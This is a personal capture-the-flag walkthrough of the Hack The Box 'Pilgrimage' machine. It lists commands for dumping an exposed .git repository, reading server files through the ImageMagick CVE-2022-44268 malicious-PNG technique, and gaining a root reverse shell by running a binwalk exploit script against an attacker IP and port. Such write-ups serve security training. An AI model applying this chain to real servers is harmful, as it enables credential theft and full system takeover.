# Pilgrimage

Tags: Linux
Level: Easy
Tools: Feroxbuster, git, magick, imagemagick, image, binwalk
Bugs: cve-2022-44268
Status: Done
Date: November 25, 2023

Started Pilgrimage 2 writeup machine hackthebox using official walkthrough

### Nmap

Started using Nmap 100 port scan

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled.png)

By Nmap scan result 2 ports are open 1. SSH, 2. HTTP it has redirect http://pilgrimage.htb, machine using linux distro.

### Enumeration

By using this information added host name in /etc/hosts

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%201.png)

In the web page having 3 functionalities Home, Signup, Login register using basic test/test credential start capturing in burp suite.

- [ ]  capture request
- [ ]  Directory path enumerate
- [ ]  curl

Let’s try to find available Directory using **feroxbuster**

```jsx
feroxbuster --url http://pilgrimage.htb -w /usr/share/seclists/Discovery/Web-
Content/common.txt
```

I found some interesting .git paths 

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%202.png)

The scan revels the .git path try to enumerate using **git-dumper**

```jsx
path https://github.com/arthaud/git-dumper
git-dumper http://website.com/.git ~/website
---git-dumper http://pilgrimage.htb/ .
```

After running git-dumper files are download their is **magick**

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%203.png)

This **magick** file returns **Imagemagic** - https://github.com/voidz0r/CVE-2022-44268.git

We try out the aforementioned Proof of Concept (PoC), which is a simple Rust application that creates the malicious PNG for us.

```jsx
git clone https://github.com/voidz0r/CVE-2022-44268.git
cd CVE-2022-44268
cargo run "/etc/passwd"
```

> Note: cargo is used to compile and run the Rust program. It is recommended that you install it
using [rustup](https://rustup.rs).
> 

```jsx
identify -verbose image.png
```

It will provide the image.png description

Or you ca generate file using 

```jsx
https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC
refere ippsec video - https://www.youtube.com/watch?v=aaUlHicClrI
```

I have uploaded payload image.png it has a profile as /etc/passwd

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%204.png)

It converted file as [http://pilgrimage.htb/shrunk/6562a2d76e015.png](http://pilgrimage.htb/shrunk/6562a2d76e015.png) then downloaded using **wget,** 

After start checking with exiftool, and identify

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%205.png)

```jsx
identify -verbose [6562a2d76e015.png](http://pilgrimage.htb/shrunk/6562a2d76e015.png)
```

It has given data in hex format save into file passwd.hex the 

1.using **cat passwd.hex | xxd -r -p** takes time

2.Using python -c ‘print(bytes.fromhex(”Enter hex code in line”))’ — like below screenshot

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%206.png)

Their is users are **root, emily**  using this information we can’t do login, The web server is using www-data user, If want log in. Need a username and **password don’t have password.**

But **index.php** file has clue server is using **sqlite** database in line number 31.

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%207.png)

using this link generating the image with payload “/var/db/pilgrimage”

[https://github.com/Sybil-Scan/imagemagick-lfi-poc](https://github.com/Sybil-Scan/imagemagick-lfi-poc)

Generated image using this payload “/var/db/pilgrimage”

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%208.png)

Let’s try to upload the file into webserver and see 

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%209.png)

Download the image using wget [http://pilgrimage.htb/shrunk/6562b558d0b6a.png](http://pilgrimage.htb/shrunk/6562b558d0b6a.png)

their is long hex code in identify -verbose abovefile.png

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2010.png)

Let’s try to login using **ssh shell**

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2011.png)

check all the directories

ps -ef —forest

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2012.png)

Their is interesting running with root access malwarescan.sh 

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2013.png)

Let’s search binwalk v2.3.2

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2014.png)

After downloading the script running script using simantaously run netcat 

[https://medium.com/@jayeshgaba/hackthebox-writeup-pilgrimage-1084d1ae8970](https://medium.com/@jayeshgaba/hackthebox-writeup-pilgrimage-1084d1ae8970)

**run below script**

```jsx
python3 51249.py binwalk_exploit.png 10.10.16.25 4444
```

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2015.png)

after running the script copy the image **binwalk_exploit.png** to the directory 

Missing some image on the **user shell**   **history** command

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2016.png)

```jsx
cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk
```

wait for some time

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2017.png)

we will get the shell back with root access

helo

![Untitled](Pilgrimage%20f2ab33fc942e41c8b40b87fd24b0e04b/Untitled%2018.png)